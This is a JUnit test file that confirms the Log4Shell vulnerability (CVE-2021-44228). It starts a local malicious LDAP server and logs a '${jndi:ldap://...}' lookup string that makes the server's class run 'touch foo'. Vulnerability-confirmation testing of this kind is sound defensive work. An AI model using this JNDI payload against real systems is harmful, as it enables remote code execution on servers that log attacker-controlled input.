import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.*;
import org.junit.jupiter.api.condition.*;
import java.io.File;
import java.io.IOException;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class ConfirmVulnerabilitiesTests {

    private static Process serverProcess = null;
    private static String PORT_STRING = "9389";  // > 1024 so works when not root

    @BeforeAll
    public static void startServers() throws IOException, InterruptedException {
        serverProcess = new ProcessBuilder("java","-jar","dodgy-ldap-server.jar","--port",PORT_STRING)
            .redirectOutput(ProcessBuilder.Redirect.INHERIT)
            .redirectError(ProcessBuilder.Redirect.INHERIT)
            .start();

        Thread.sleep(5_000);

    }

    @BeforeEach
    public void clearGeneratedFile() {
        File file = new File("foo");
        if (file.exists()) {
            Assumptions.assumeTrue(file.delete());
        }
    }

    @AfterAll
    public static void shutdownServers() {
        serverProcess.destroyForcibly();
    }

    @Test
    @EnabledOnOs({OS.MAC,OS.LINUX})
    public void confirmCVE202144228 () throws Exception {
        File file = new File("foo");
        Assumptions.assumeFalse(file.exists());
        Assumptions.assumeTrue(serverProcess!=null);

        Logger logger = LogManager.getLogger(ConfirmVulnerabilitiesTests.class);
        // System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true"); //Must be true for 1.8 and 1.7 versions
        logger.error("${jndi:ldap://127.0.0.1:" + PORT_STRING + "/exe}");  // a server side class will be loaded and in the process run `touch foo`

        Thread.sleep(1000);
        assertTrue(file.exists());
    }

}
